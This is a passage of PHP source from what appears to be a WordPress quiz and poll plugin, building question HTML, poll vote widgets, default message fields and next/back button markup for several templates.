							$quiz_temp_right_bgcolor = $temp_customizer[2];
						}
						if(isset($temp_customizer[3])){
							$quiz_temp_heights = $temp_customizer[3];
						}
						if(isset($temp_customizer[4])){
							$background_image_url = stripslashes($temp_customizer[4]);
						}
						if(isset($temp_customizer[5])){
							$background_image_size = stripslashes($temp_customizer[5]);
						}
						if(isset($temp_customizer[6])){
							$background_image_repeat = stripslashes($temp_customizer[6]);
						}
						if(isset($temp_customizer[7])){
							$background_image_position = stripslashes($temp_customizer[7]);
						}
						if(isset($temp_customizer[8])){
							$title_background_color = stripslashes($temp_customizer[8]);
						}
						if(isset($temp_customizer[9])){
							$title_background_color_opacity = stripslashes($temp_customizer[9]);
						}
						if(isset($temp_customizer[10])){
							$progress_bar_color = stripslashes($temp_customizer[10]);
						}
					}

					if($question_type == 'matrix'){
						$getMatrixColwidth = $sqbquestionobj->getMatrixColumnWidth();
						if($getMatrixColwidth >0){
							$styleformatrix .= "<style>#quiz_temp_id".$question_id." .sqb-answer-matrix-table-scroll table.SQB-main-table tbody th.SQB-fixed-side {  min-width: 50px;   width: ".$getMatrixColwidth."%;}
							}</style>";
						}
					}
					
					
					if(!isset($progress_bar_color) || $progress_bar_color == ''){
						$progress_bar_color = '#000';
					}
					
					$title_background_color_style = '';	
					$sqb_start_screen_background_image = '';	
					$left_side_bar_style = '';
					if($title_background_color_opacity == 'false' || $title_background_color_opacity == ''){
						$title_background_color_opacity = 'rgba(0,0,0,0)';
					}
						
					if($enable_background_image == 'Y' && $background_image_url != ''){
						$left_side_bar_style .= "background-color:".$title_background_color_opacity.";"; 
						$opacity_arr = explode(',',$title_background_color_opacity);
						$opacity = floatval($opacity_arr[3]);
						$opacity_style = '';
						if($opacity > 0){
						$opacity_style = "opacity:".$opacity.";";
						}
						//$left_side_bar_style .= "background-image: linear-gradient(".$title_background_color_opacity.", ".$title_background_color_opacity."),url('".$background_image_url."');";
						//$left_side_bar_style .= "background-size:".$background_image_size.";"; 
						//$left_side_bar_style .= "background-repeat:".$background_image_repeat.";"; 
						//$left_side_bar_style .= "background-position:".$background_image_position.";";
						$title_background_color_style = "background-color:".$title_background_color.";";
						$sqb_start_screen_background_image = " sqb_start_screen_background_image";
						$background_image_div = "<div class='quiz-bg-img' style='$opacity_style'><img src=".$background_image_url." alt='background'></div>";
					} else {
						$left_side_bar_style .= "background-color:".$quiz_temp_left_bgcolor.";";
						$background_image_url = '';
						$sqb_start_screen_background_image = '';
						$background_image_div = "";
					}
					
					$question_type_slider_class = '';
					if($question_type  == 'slider' || $question_type  == 'numerical_text'){
						$question_type_slider_class  = ' question_type_slider_has ';
					}
					 
					//$show_correct_incorrect_ans = $sqbquestionobj->getShowCorrectIncorrectAns();	
					//echo $ans_layout."--".$show_ans_img. "</br>";
					//show image for answer
					if( $show_ans_img == "Y"){
						$add_show_img_cls = " image_option_has ";
					}else{
						if($template_num == 'template7'){
						$add_show_img_cls = "no_image_option";
						} else {
						$add_show_img_cls = "";
						}
					}
					 
					//show grid layout for answer( 2 in a row)
					
					 
					if($ans_layout == "layout-four-in-row"){
					   $add_anslayout_cls = " layout-four-in-row-active grid-layout-active ";	   
					}else if($ans_layout == "layout-five-in-row"){
					   $add_anslayout_cls = " layout-five-in-row-active grid-layout-active ";	   
				    }else if($ans_layout == "layout-six-in-row"){
					   $add_anslayout_cls = " layout-six-in-row-active grid-layout-active ";		   
					}elseif( $ans_layout == "layout-three-in-row"){
						$add_anslayout_cls = "layout-three-in-row-active grid-layout-active";
					}elseif( $ans_layout == "multiple"){
						$add_anslayout_cls = " layout-two-in-row-active grid-layout-active ";
					}else{
						$add_anslayout_cls = "one-in-a-row";
					}		
					$answersdataobj_cout_class = ''	;
					
					//get answers of the question
					$answersdataobj_cout =  SQB_QuizAnswers::loadByQuestionId($question_id);	 
					if(isset($answersdataobj_cout) && count($answersdataobj_cout) < 10){
						$answersdataobj_cout_class = 'ranting_level_'.count($answersdataobj_cout);
					}
					
					//$answerdata1 = sqbGetAnswers($quizid, $quiz_type, $question_id, $ques_template, $question_type, $branching,$multiple_correct , $answers_random,$course_id,$lesson_id, $dap_id,$file_upload_settings,$max_file_upload_size,$matrix_label_text,$matrix_html);
					$answerdata_array = sqbGetAnswers($quizid, $quiz_type, $question_id, $ques_template, $question_type, $branching,$multiple_correct , $answers_random,$course_id,$lesson_id, $dap_id,$file_upload_settings,$max_file_upload_size,$matrix_label_text,$matrix_html);
					
					$answerdata1 = '';
					$recommendation_html = '';
					if(is_array($answerdata_array)){
						$answerdata1 = $answerdata_array['answerdata'];
						$recommendation_html = $answerdata_array['recommendation_html'];
						
					}


					if(!empty($adsHTML[$question_id])){
						$ads_html_content = $adsHTML[$question_id];
					}else{
						$ads_html_content ='';
					}

					if($question_type  == 'single'){
						$other_option_textarea = '<textarea class="custom-other-box" style="display:none;"></textarea>';
					}else{
						$other_option_textarea = '';
					}

					$hide_cls = '';
					$poll_results = '';
					$total = 0;
					$is_voted = 0;
					if($quiz_type == 'poll'){

						$rows = get_poll_results($quizid);

						$votes_count = getVoteResultsFormated($quizid, $rows);

						$votes = json_encode($votes_count);



						$is_voted = sqb_is_voted($quizid);
						//echo 'T: '.$is_voted;
						$total = array_reduce($rows, function($carry, $item) {
						    $carry += $item['cnt'];
						    return $carry;
						});

						//if(!empty($_COOKIE['vote_'.$quizid])){
						if(!empty($is_voted)){
							$hide_cls = 'hide_cls';
							$poll_results = '';
							
							//print_r($rows);
							$per = array();
							$poll_results = generate_vote_results($rows,$quizid);


							
						}else{
							$hide_cls = '';
						}

					}

					$hide_cls = '';
					//$answerdata = $rating_html.'<div class="answer_container question_add_answer_outer_div '.$add_show_img_cls.$add_anslayout_cls.' '.$answersdataobj_cout_class.$question_type_slider_class.' "> '.$answerdata1.$other_option_textarea.'</div>';	
					
					$imageSetting = !empty($imageSetting) ? $imageSetting : array();

					$ans_image_size_option = !empty($imageSetting['ans_image_size_option']) ? $imageSetting['ans_image_size_option'] : '';

					$image_option = 'image-option-'.$ans_image_size_option;

					$answerdata = $rating_html.'<div class="answer_container question_add_answer_outer_div '.$image_option.' '.$hide_cls.' '.$add_show_img_cls.$add_anslayout_cls.' '.$answersdataobj_cout_class.$question_type_slider_class.' " '.$question_inner_style.'> '.$answerdata1.$other_option_textarea.'</div>';		
										

					/*if(!empty($poll_results)){
						$answerdata .= $poll_results;

					}*/

					if($quiz_type == 'poll'){
						$hide_number = sqb_get_param($quizid,'hide_number');
						$change_vote = sqb_get_param($quizid,'change_vote');
						$repeat_voting = sqb_get_param($quizid,'repeat_voting');
						$is_close_specific_time = sqb_get_param($quizid,'close_specific_time');
						$close_poll_time = sqb_get_param($quizid,'close_poll');
						$allow_viewing_result = sqb_get_param($quizid,'allow_viewing_result');
						
						$allow_voting = sqb_get_param($quizid,'allow_voting');
						$change_vote_content = sqb_get_param($quizid,'change_vote_content');

						$view_result_content = sqb_get_param($quizid,'view_result_content','View Result');
						//echo $view_result_content;exit;
						$return_poll_content = sqb_get_param($quizid,'return_poll_content','Poll to return');
						$show_vote_count_content = sqb_get_param($quizid,'show_vote_count','Vote(s)');

						//$chagevote = !$is_voted ? 'hide_cls' : 'show_cls';

						$chagevote = !$is_voted ? 'hide_cls' : 'show_cls';
						
						if($repeat_voting == 'browser-ip-based'){

							if(!empty($poll_results)){
								$chagevote = 'show_cls';
								//echo $chagevote;exit;
							}
							//$chagevote = 'hide_cls';
						}

						if($repeat_voting == 'browser-based' && empty($allow_voting)){
							if(!empty($poll_results)){
								$chagevote = 'show_cls';
							}
						}else if($repeat_voting == 'browser-based' && !empty($allow_voting)){
							/*global $wpdb;
							$sqb_manage_leads = $wpdb->prefix .'sqb_manage_leads';
							$cookie_data = !empty($_COOKIE['vote_'.$quizid]) ? $_COOKIE['vote_'.$quizid] : array();
							$data = json_decode(stripslashes($cookie_data));
							$uid = $data->lead_rel;
							$sql = "SELECT count(id) FROM ".$sqb_manage_leads." WHERE quiz_id = '".$quizid."' AND date = '".$uid."' and DATE_ADD(date, INTERVAL ".$allow_voting." HOUR) < '".date('Y-m-d h:i:s')."' LIMIT 1";
							
							$id = $wpdb->get_var($sql);
							
							if(empty($id)){
								$chagevote = 'hide_cls';
							}*/
						}

						if($sqbObj->getShowOptinScreen() == 'Y'){
							$chagevote = 'hide_cls';
						}

						$change_vote_text = !empty($change_vote_content) ? stripslashes($change_vote_content) : 'Change Vote';

						$buttoncls = $is_voted ? 'hide_cls' : 'show_cls';
						$show_vote_count = ($hide_number != 'Y') ? '<span class="sqb-change-vote-count">'.$total.'</span> '.$show_vote_count_content.'' : '';
						$show_changecount = ($change_vote == 'Y' && $repeat_voting != 'repeated-voting') ? '<div class="sqb-change-vote '.$chagevote.'">'.$change_vote_text.'</div>' : '';




						/*if($is_close_specific_time == 'Y' && !empty($close_poll_time)){
							$seperator = !empty($show_vote_count) ? ' &#8226; ' : '';
							$show_vote_count .= $seperator.sqb_time_left($close_poll_time);
						}*/

						// Hide change vote button if voting closed
						/*if(!is_voting_open($quiz_id)){
							$show_changecount = '';
						}*/
						$show_view_result = '';
						if($allow_viewing_result == 'Y'){
							$vr_showhide = ($is_voted) ? 'hide_cls' : 'show_cls';
							$show_view_result = '<a href="javascript:void(0);" class="sqb-view-result '.$vr_showhide.'">'.$view_result_content.'</a>
								<a href="javascript:void(0);" style="display:none;" class="sqb-return-poll">'.$return_poll_content.'</a>';
						}

						$question_title = $sqbquestionobj->getQuestionTitle();
						$question_id = $sqbquestionobj->getId();

						
						$poll_error = '';
						$error_show_style = 'none';

						$is_poll_open_error = 0;
						$is_poll_close_error = 0;
						if(!is_poll_open($quizid)){
							$start_poll_html = sqb_get_param($quizid,'start_poll_html');
							$poll_error = $start_poll_html;
							$poll_error_show = 1;
							$is_poll_open_error = 1;
							$error_show_style = ($poll_error_show) ? 'block' : 'none';
						}elseif(!is_voting_open($quizid)){
							$close_poll_html = sqb_get_param($quizid,'close_poll_html');
							$poll_error = $close_poll_html;
							$poll_error_show = 1;
							$error_show_style = ($poll_error_show) ? 'block' : 'none';
							$is_poll_close_error = 1;
						}

						$vote_btn_html = sqb_get_param($quizid,'vote_btn_html');
						$vote_customizer = sqb_get_param($quizid,'vote_customizer');

						/*echo "<pre>";
						print_r($vote_customizer);
						print_r(trim(strip_tags($vote_btn_html)));
						exit;*/


						$vote_style = !empty($vote_customizer[0]['vote_style']) ? str_replace('"','',$vote_customizer[0]['vote_style']) : '';
						$vote_text = !empty($vote_btn_html) ? trim(strip_tags($vote_btn_html,'<span>')) : 'Vote';

						$wi = !empty($temp_customizer[1]) ? ((int)$temp_customizer[1]+40).'px' : '100%'; 

						$answerdata .= '
						<div class="poll-wrapper" style="max-width : '.$wi.'px">
							<div class="sqb-vote-error" style="display:'.$error_show_style.';">'.$poll_error.'</div>
							<div class="sqb-vote-footer">
								<input type="hidden" value="'.$chagevote.'" id="allow_change_vote" />
								<div class="sqb-change-vote-count-results">'.$show_vote_count.'</div>
								<div class="sqb-change-vote-action">
									'.$show_changecount.'
									'.$show_view_result.'
									<button class="sqb_next_btn single_next_btn btn-add-vote '.$buttoncls.'" disabled data-questiontitle="'.$question_id.'" style="'.$vote_style.'">'.$vote_text.'</button>
								</div>
							</div>
						</div>
						';
						$answerdata .= '<input type="hidden" style="display:none" class="js-vote-list" value="'.urlencode($votes).'">';
						$answerdata .= '<input type="hidden" style="display:none" class="js-is-vote" value="'.$is_voted.'">';
						$answerdata .= '<input type="hidden" style="display:none" class="js-thankyou" value="'.urlencode(getPollThankyou($quizid)).'">';
						$answerdata .= '<input type="hidden" style="display:none" class="js-is-poll-open-error" value="'.$is_poll_open_error.'">';
						$answerdata .= '<input type="hidden" style="display:none" class="js-is-poll-close-error" value="'.$is_poll_close_error.'">';
						$answerdata .= '<input type="hidden" style="display:none" class="js-is-poll-view-result" value="'.$allow_viewing_result.'">';
					}


					if($quiz_type == 'poll'){
						$style = ($template_num == 'template8') ? 'max-width:'.((int)$temp_customizer[1]+40).'px' : '';
						$start_wrapper = '<div class="poll-quiz-main '.$template_num.'" style="'.$style.'">';
						$close_wrapper = '</div>';
					}else{
						$start_wrapper = '';
						$close_wrapper = '';
					}

					$question_data = $start_wrapper.stripslashes($question).$answerdata.$close_wrapper;	

					/*if($quiz_type == 'poll'){
						$question_data .= '</div>';
					}*/
					
					//setting messages
					$correct_answer_msg = sqbGetValidSettingsByKey('correct_answer_msg');
					if($correct_answer_msg == ""){
						$correct_answer_msg =  'This is the correct answer.' ;
					}
					
					$incorrect_answer_msg = sqbGetValidSettingsByKey('incorrect_answer_msg');
					if($incorrect_answer_msg == ""){
						$incorrect_answer_msg =  'This answer is incorrect.';
					}
					
					$username_empty_msg = sqbGetValidSettingsByKey('username_empty_msg');
					if($username_empty_msg == ""){
						$username_empty_msg =  'Username is a required field.';
					}				
					 
					$email_empty_msg = sqbGetValidSettingsByKey('email_empty_msg');
					if($email_empty_msg == ""){
						$email_empty_msg =   'Email is a required field.';
					}
					$valid_email = sqbGetValidSettingsByKey('valid_email');
					if($valid_email == ""){
						$valid_email =  'Please enter a valid email address.';
					}
					$terms_condition_msg = sqbGetValidSettingsByKey('terms_condition_msg');
					if($terms_condition_msg == ""){
						$terms_condition_msg =  'Please accept the terms to proceed.';
					}
					$progressSettings = sqbGetValidSettingsByKey('progressbar_color');
					if($progressSettings == ""){
						$progressSettings = '#007bff||#e9ecef';
					}
					$answer_background = sqbGetValidSettingsByKey('answer_background');
					if($answer_background == ""){
						$answer_background = '#007bff||#e9ecef';
					}				  
					$answer_background = explode('||' , $answer_background);
					
					$upload_button_text = sqbGetValidSettingsByKey('upload_button_text');
					if($upload_button_text == ""){
						$upload_button_text = 'Upload';
					}
					$uploaded_filename_text = sqbGetValidSettingsByKey('uploaded_filename_text');
					if($uploaded_filename_text == ""){
						$uploaded_filename_text = 'Filename:';
					}
					$file_uploaded_message = sqbGetValidSettingsByKey('file_uploaded_message');
					if($file_uploaded_message == ""){
						$file_uploaded_message = 'File uploaded successfully';
					}
					$file_upload_failed_message = sqbGetValidSettingsByKey('file_upload_failed_message');
					if($file_upload_failed_message == ""){
						$file_upload_failed_message = 'Sorry, this file extension is not supported.';
					}
					$upload_filesize_limit_exceeds_message = sqbGetValidSettingsByKey('upload_filesize_limit_exceeds_message');
					if($upload_filesize_limit_exceeds_message == ""){
						$upload_filesize_limit_exceeds_message = 'Sorry, this file exceeds the allowed file size limit.';
					}
					$file_upload_validation = sqbGetValidSettingsByKey('file_upload_validation');
					if($file_upload_validation == ""){
						$file_upload_validation = 'Please upload a file.';
					}
					$required_field = sqbGetValidSettingsByKey('required_field');
					if($required_field == ""){
						$required_field = 'Required field cannot be empty.';
					} 

					$gdpr_required_field = sqbGetValidSettingsByKey('gdpr_required_field');
					if($gdpr_required_field == ""){
						$gdpr_required_field = 'Please select checkbox.';
					} 
 	
					$outcome_screen_answer = sqbGetValidSettingsByKey('outcome_screen_answer');
					if($outcome_screen_answer == ""){
						$outcome_screen_answer = 'Your Answer:';
					} 

					$outcome_screen_result = sqbGetValidSettingsByKey('outcome_screen_result');
					if($outcome_screen_result == ""){
						$outcome_screen_result = 'Your Result:';
					} 

					$outcome_screen_correct_answer = sqbGetValidSettingsByKey('outcome_screen_correct_answer');
					if($outcome_screen_correct_answer == ""){
						$outcome_screen_correct_answer = 'Correct Answer:';
					} 

					$outcome_screen_incorrect_answer = sqbGetValidSettingsByKey('outcome_screen_incorrect_answer');
					if($outcome_screen_incorrect_answer == ""){
						$outcome_screen_incorrect_answer = 'Incorrect Answer Explanation:';
					} 
					
					$fb_share_thank_you_msg = sqbGetValidSettingsByKey('fb_share_thank_you_msg');
					if($outcome_screen_incorrect_answer == ""){
						$fb_share_thank_you_msg = 'Thanks for sharing!';
					}
					
					$fb_share_error_msg = sqbGetValidSettingsByKey('fb_share_error_msg');
					if($fb_share_error_msg == ""){
						$fb_share_error_msg = 'Sorry, you need to share on social to see results.';
					}
					
					$settings_data ='					
					<input type="hidden" id="common_correct_msg" value="'.$correct_answer_msg.'"/>
					<input type="hidden" id="common_incorrect_msg" value="'.$incorrect_answer_msg.'"/>
					<input type="hidden" id="username_empty_msg" value="'.$username_empty_msg.'"/>
					<input type="hidden" id="email_empty_msg" value="'.$email_empty_msg.'"/>
					<input type="hidden" id="terms_condition_msg" value="'.$terms_condition_msg.'"/>
					<input type="hidden" id="progressSettings" value="'.$progressSettings.'"/>	
					<input type="hidden" id="valid_email" value="'.$valid_email.'"/>	
					<input type="hidden" id="uploaded_filename_text" value="'.$uploaded_filename_text.'"/>
					<input type="hidden" id="upload_button_text" value="'.$upload_button_text.'"/>
					<input type="hidden" id="file_uploaded_message" value="'.$file_uploaded_message.'"/>
					<input type="hidden" id="file_upload_failed_message" value="'.$file_upload_failed_message.'"/>
					<input type="hidden" id="upload_filesize_limit_exceeds_message" value="'.$upload_filesize_limit_exceeds_message.'"/>
					<input type="hidden" id="file_upload_validation" value="'.$file_upload_validation.'"/> 
					<input type="hidden" id="sqb_required_field" value="'.$required_field.'"/> 
					<input type="hidden" id="sqb_gdpr_required_field" value="'.$gdpr_required_field.'"/> 
					<input type="hidden" id="sqb_outcome_screen_answer_field" value="'.$outcome_screen_answer.'"/> 
					<input type="hidden" id="sqb_outcome_screen_result_field" value="'.$outcome_screen_result.'"/> 
					<input type="hidden" id="sqb_outcome_screen_correct_answer_field" value="'.$outcome_screen_correct_answer.'"/> 
					<input type="hidden" id="sqb_outcome_screen_incorrect_answer_field" value="'.$outcome_screen_incorrect_answer.'"/> 
					 <input type="hidden" id="fb_share_thank_you_msg" value="'.$fb_share_thank_you_msg.'"/><input type="hidden" id="fb_share_error_msg" value="'.$fb_share_error_msg.'"/> ';

					
					
					$button_data ="";
					$nextbutton_data ="";
					$single_fillin_text ="";
					$muli_or_single_cls = "single_next_btn_container";
					$disable_nextbutton = "";	
					
					$nextBtnHtml = sqbGetValidSettingsByKey('next_button_html');
					$backBtnHtml = sqbGetValidSettingsByKey('back_button_html');
					$file_upload_btn_html = sqbGetValidSettingsByKey('file_upload_btn_html');
					
					//check if quiz_type = survey
					if($quiz_type == "survey" || $quiz_type == "calculator"){		
								 
						if( $question_type == "text" || $question_type == "fill_in_blank"){
							$disable_nextbutton = "disable_nextbutton";		
							$muli_or_single_cls = "single_next_btn_container";						 
							$single_fillin_text = "single_fillin_text";	
												 
							if(isset($nextBtnHtml) && $nextBtnHtml != ''){
								$nextbutton_data = stripslashes($nextBtnHtml);
							}else{
								$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
							}		
						}else if($question_type == "multi"){  
								$muli_or_single_cls = "multi_next_btn_container";							 
												 
							if(isset($nextBtnHtml) && $nextBtnHtml != ''){
								$nextbutton_data = stripslashes($nextBtnHtml);
							}else{
								$nextbutton_data = '<button class="sqb_next_btn multiple_next_btn">Next</button>';
							}										 
						}else if($question_type == "ranking_choices"){  
												 
							if(isset($nextBtnHtml) && $nextBtnHtml != ''){
								$nextbutton_data = stripslashes($nextBtnHtml);
							}else{
								$nextbutton_data = '<button class="sqb_next_btn multiple_next_btn">Next</button>';
							}										 
						}else if($question_type == "dropdown"){  
												 
							if(isset($nextBtnHtml) && $nextBtnHtml != ''){
								$nextbutton_data = stripslashes($nextBtnHtml);
							}else{
								$nextbutton_data = '<button class="sqb_next_btn single_next_btn">Next</button>';
							}										 
						}else{
							$nextbutton_data = "";
						}
					}
					
					//show next button
					$nextbutton_data ="";		
					$backbutton_data ="";		
			
					
					if($question_type == "file_upload" || $question_type == "single" || $question_type == "slider" || $question_type == "matrix" || $question_type == "text" || $question_type == "yes_no" || $question_type == "dropdown" || $question_type == "numerical_text" || $question_type == "date" || $question_type == "matching_text" || $question_type == "email" ||  $question_type == "phone_number" || $question_type == 'ranking_choices' || $question_type == 'weight_and_height'){  	
						$display_nextbuttons = 'yes';			
					}

					if($display_nextbuttons == "yes"){
						if(isset($nextBtnHtml) && $nextBtnHtml != ''){
							$nextbutton_data = stripslashes($nextBtnHtml);
						}else{
							$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';	
						}

						
						
						if($question_type == "file_upload"){
							if(isset($file_upload_btn_html) && $file_upload_btn_html != ''){
							$nextbutton_data = $file_upload_btn_html;
							$nextbutton_data .= '<button class=" sqb_next_btn single_next_btn" style=" display: none">Next</button>';
							} else {
							$nextbutton_data = '<button class="file_upload_button" style=" display: inline-block;">'.$upload_button_text.'</button>';
							$nextbutton_data .= '<button class=" sqb_next_btn single_next_btn" style=" display: none">Next</button>';
							}
						} else if($template_num == 'template5' || $template_num == 'template7' || $template_num == 'template8'){
								if(isset($next_button_html) && $next_button_html != ''){
									$nextbutton_data = $next_button_html;
								} else {							
									$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
								}
						}
					} 
					
					//show multiple_correct for answer for all type of quizzes
					if(($multiple_correct == "Y") && ($question_type == "multi")){
						$display_nextbuttons = 'yes';
						$multiple_correct_cls = " multiple_correct_cls ";
						if(isset($nextBtnHtml) && $nextBtnHtml != ''){
							$nextbutton_data = stripslashes($nextBtnHtml);
						}else{
							$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
						}
						
						if($template_num == 'template5' || $template_num == 'template7' || $template_num == 'template8'){
							if(isset($next_button_html) && $next_button_html != ''){
								$nextbutton_data = $next_button_html;
							} else {							
								$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
							}
						}
						
					}else{ 
						$multiple_correct_cls = "";
					}
					
					//show ranking_choices for answer for all type of quizzes
					if($question_type == "ranking_choices"){
						$ranking_choice_correct_cls = " ranking_choice_correct_cls ";
						
						if(isset($nextBtnHtml) && $nextBtnHtml != ''){
							$nextbutton_data = stripslashes($nextBtnHtml);
						}else{
							$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
						}
						
						if($template_num == 'template5' || $template_num == 'template7' || $template_num == 'template8'){
							if(isset($next_button_html) && $next_button_html != ''){
								$nextbutton_data = $next_button_html;
							} else {							
								$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
							}
						}
						
					}else{ 
						$ranking_choice_correct_cls = "";
					}

					
					
					
					 if($quiz_type == "survey" || $quiz_type == "personality" ||  $quiz_type == "assessment" ||  $quiz_type == "scoring"  || $quiz_type == "calculator"){
						 	
						if($allow_skip_ques =="Y"){
							if(isset($nextBtnHtml) && $nextBtnHtml != ''){
								$nextbutton_data = stripslashes($nextBtnHtml);
							}else{
								$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
							}

							
							if($question_type == "file_upload"){
								if(isset($file_upload_btn_html) && $file_upload_btn_html != ''){
								$nextbutton_data = $file_upload_btn_html;
								$nextbutton_data .= '<button class=" sqb_next_btn single_next_btn" style=" display: none">Next</button>';
								} else {
								$nextbutton_data = '<button class="file_upload_button" style=" display: inline-block;">Upload</button>';
								$nextbutton_data .= '<button class=" sqb_next_btn single_next_btn" style=" display: none">Next</button>';
								}
							}else if($template_num == 'template5' || $template_num == 'template7' || $template_num == 'template8'){
								if(isset($next_button_html) && $next_button_html != ''){
									$nextbutton_data = $next_button_html;
								} else {							
									$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
								}
							}
						}
								 			 
						if( $question_type == "text" ||$question_type == "date" || $question_type == "fill_in_blank" || $question_type == "numerical_text" || $question_type == "matching_text" || $question_type == "phone_number"){
							
							if($allow_skip_ques =="Y"){
								$disable_nextbutton = " ";	
							}else{
								if($question_type != 'phone_number'){
									$disable_nextbutton = "disable_nextbutton";	
								}else{
									$disable_nextbutton = " ";
								}
							}
							if( $quiz_type == "personality" ||  $quiz_type == "assessment" ||  $quiz_type == "scoring"){	
								$muli_or_single_cls = "single_next_btn_container";						 
								$single_fillin_text = "single_fillin_text";	
							}						 				 
							if(isset($nextBtnHtml) && $nextBtnHtml != ''){

								$nextbutton_data = stripslashes($nextBtnHtml);
							}else{
								$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
							}
							
							if($template_num == 'template5' || $template_num == 'template7' || $template_num == 'template8'){
								
								if(isset($next_button_html) && $next_button_html != ''){
									
									$nextbutton_data = $next_button_html;
								} else {							
									$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
								}
							}
						}
					} 
				  
					// pagination only for inpage	

					if($quiz_type == 'poll'){
						$nextbutton_data = '';

						
						
					}

					if($quiz_type == 'personality' && $display_backbutton == 'yes'){
						if(isset($backBtnHtml) && $backBtnHtml != ''){
							$backbutton_data = stripslashes($backBtnHtml);
						}else{
							$backbutton_data = '<div class="single_back_btn sqb_back_btn" style="display: inline-block; border-radius: 5px; background: #000000; color: #ffffff; height: auto; padding: 12px 15px; font-family: &quot;DM Sans&quot;, sans-serif; min-width: 90px; box-shadow: none; margin: 0px; text-decoration: none; line-height: normal; border: none; text-align: center; text-transform: initial; font-size: 16px; font-weight: 600; width: 100px; max-width: 100%; cursor: pointer; float: none; position: relative;"><div>Back</div></div>';	
						}
					}
					

					$buttondata_inn = '<div class="back-next-btn">'.$button_data.$backbutton_data.$nextbutton_data.'</div>';
					$quiz_pagination_cls =""; 					 
					if( $quiz_pagination =="one_per_page"){
						$question_per_page =1;
						//for first question	 
						if($ques_count == 1){
							$display_ques_div = 'show_cls';					
						}else{
							$display_ques_div = 'hide_cls';	
						}				 
					} 	
					
					// pagination only for inpage, 	 quiz_pagination = all	
					$quiz_pagination_all_start='';
					$quiz_pagination_all_end='';
					
					$allow_show_all_questions = false;
					
					if($branching == 'Y'){	
					}else{		
						if( $quiz_display =="inpage"){ 
							if( $quiz_pagination =="all"){		
								$allow_show_all_questions =true;						 
							}						
						} 
					} 
					// for lesson  quiz_pagination = all	
					$getlesonstyle ="";
					$seedetails = "";
					if($lesson_id !=''){
						$allow_show_all_questions =true;	
						$dap_see_details_btn_html = sqbGetValidSettingsByKey('dap_see_details_btn_html');
						if(isset($dap_see_details_btn_html) && $dap_see_details_btn_html != ''){
							$seedetails = stripslashes($dap_see_details_btn_html);
						}else{
							$seedetails =' <div class="dap_see_details_btn sqb_tiny_mce_editor" style=" "><div>See Details</div></div>	';	
						}
						
						if(isset($nextBtnHtml) && $nextBtnHtml != ''){
							$nextbutton_data = stripslashes($nextBtnHtml);
						}else{
							$nextbutton_data = '<button class=" sqb_next_btn single_next_btn" style=" display: inline-block;">Next</button>';
						}
						
						$getlesonstyle= getLessonQuesAnsStyle();
					}
					
					if($allow_show_all_questions == true){

						if($quiz_pagination !="all"){
							$quiz_pagination ="one_per_page";
							$question_per_page="1";
							$display_ques_div = 'hide_cls';	
							
							//for first question	 
							if($ques_count == 1){
								$display_ques_div = 'show_cls';					
							}else{
								$display_ques_div = 'hide_cls';	
							}
							$quiz_pagination_cls ="quiz_pagination_all";
							$multiple_ques_true="multiple_ques_true one_per_page_div";								 
							$buttondata_outer = $button_data.$seedetails;	
							$buttondata_inn=$nextbutton_data;
						}else{ 
							$quiz_pagination ="all";			
							$question_per_page="9999";
							$display_ques_div = 'show_cls';	
							$quiz_pagination_cls ="quiz_pagination_all";								 
							$buttondata_outer = $button_data.$seedetails;	
							$buttondata_inn=$nextbutton_data;
							$multiple_ques_true="multiple_ques_true";
							$quiz_pagination_divider ='<div class="sqbdivider"></div>';								
						}					
					}
					
					$continue_button_html ='';
					$skip_button = '';
					if($template_num == 'template7'){
						if($allow_skip_ques == 'Y' && $branching != 'Y'){
							$skip_button = '<div class="skip-question-action"> '.$skip_button_html.'</div>';
							$continue_button = $nextbutton_data;
						} else {
							$continue_button = $nextbutton_data;
						}

						$backbutton_data ="";		
						if($quiz_type == 'personality' && $display_backbutton == 'yes'){
							if(isset($backBtnHtml) && $backBtnHtml != ''){
								$backbutton_data = stripslashes($backBtnHtml);
							}else{
								$backbutton_data = '<div class="single_back_btn sqb_back_btn" style="display: inline-block; border-radius: 5px; background: #000000; color: #ffffff; height: auto; padding: 12px 15px; font-family: &quot;DM Sans&quot;, sans-serif; min-width: 90px; box-shadow: none; margin: 0px; text-decoration: none; line-height: normal; border: none; text-align: center; text-transform: initial; font-size: 16px; font-weight: 600; width: 100px; max-width: 100%; cursor: pointer; float: none; position: relative;"><div>Back</div></div>';	
							}
						}

						$buttondata_inn = '<div class="continue-question-action">'.$backbutton_data.$continue_button.'</div>'.$skip_button;
						//$skip_button = '<div class="skip-question-action"><div class="skip-question-btn single_next_btn sqb_next_btn"><div>Skip Question</div></div></div>';
					}
					
					if($template_num == 'template8'){
						
						$continue_button = '';
						if($allow_skip_ques == 'Y' && $branching != 'Y'){
						    $skip_button = '<div class="skip-question-action"> '.$skip_button_html.'</div>';
						    if($display_nextbuttons == 'yes'){
							$continue_button = '<div class="continue-question-action">'.$nextbutton_data.'</div>';
							}
						} else {
							if($display_nextbuttons == 'yes'){
							$continue_button = '<div class="continue-question-action">'.$nextbutton_data.'</div>';
							}
						}
						
						$backbutton_data ="";		
						if($quiz_type == 'personality' && $display_backbutton == 'yes'){
							if(isset($backBtnHtml) && $backBtnHtml != ''){
								$backbutton_data = stripslashes($backBtnHtml);
							}else{
